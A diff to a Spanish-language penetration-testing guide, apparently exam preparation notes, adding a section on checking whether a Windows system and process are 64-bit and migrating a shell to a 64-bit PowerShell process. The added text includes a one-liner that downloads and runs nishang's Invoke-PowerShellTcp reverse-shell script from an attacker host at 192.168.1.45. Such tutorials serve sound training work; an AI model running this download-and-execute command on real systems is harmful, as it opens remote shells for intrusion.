@@ -1581,8 +1581,15 @@ En cuestión de unos segundos, veremos como se recibe un **GET** del lado de nue
 
 Aunque las máquinas Windows del examen suelen ser de 32 bits, como más vale prevenir que curar detallo una técnica para migrar de un proceso de 32 bits a uno de 64 bits. Cabe decir que este procedimiento es importante de cara a la correcta enumeración del sistema, pues en caso de figurar en un proceso que no corra bajo la arquitectura de la máquina, tanto **Sherlock**, como **PowerUp.ps1** como incluso el propio **suggester** de Metasploit, darán montón de falsos positivos.
 
-Nunca está de más tampoco saber con qué tipo de sistema operativo estamos tratando, así como si estamos en un proceso de 64 bits o de 32 bits, para la posterior migración. Podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a través de las siguientes consultas:
+El saber con qué aquitectura estamos tratando tanto del sistema operativo como a nivel de proceso, podemos hacerlo via **Powershell**, obteniendo **True** o **False** dependiendo de si es cierto o no a través de las siguientes consultas:
 
 `[Environment]::Is64BitOperatingSystem`
+
 `[Environment]::Is64BitProcess`
+
+Si vemos que se trata de un sistema operativo de 64 bits, y la sentencia `[Environment]::Is64BitProcess` nos devuelve un **False**, lo único que tendremos que hacer es por ejemplo ganando sesión por Powershell invocar al mismo desde la siguiente ruta:
+
+`C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.1.45:443/Invoke-PowerShellTcp.ps1')`
+
+Compartiendo el recurso sitado de **nishang**. Si volvemos a checkear en qué proceso nos situamos, podremos ver que esta vez la consulta `[Environment]::Is64BitProcess` nos devolverá un **True**, pudiendo ya proseguir con la enumeración a nivel de sistema.
 
